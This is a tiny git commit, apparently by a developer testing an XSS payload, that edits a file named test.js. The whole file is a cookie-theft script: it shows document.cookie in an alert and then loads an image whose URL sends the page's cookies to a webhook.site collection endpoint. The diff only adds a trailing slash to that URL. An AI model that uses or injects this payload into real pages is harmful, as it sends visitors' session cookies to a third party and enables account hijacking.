f0e7b867916c8a6bb0ba4802681f81bfcc84cc53
darrenangwx <darrenawx@gmail.com>
2024-02-18 04:16:22 +0800

    testest

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 alert(document.cookie);
 var i = new Image();
 i.src =
-  "https://webhook.site/d8c9a517-27b7-4283-a8eb-aece67a41659?" +
+  "https://webhook.site/d8c9a517-27b7-4283-a8eb-aece67a41659/?" +
   document.cookie;
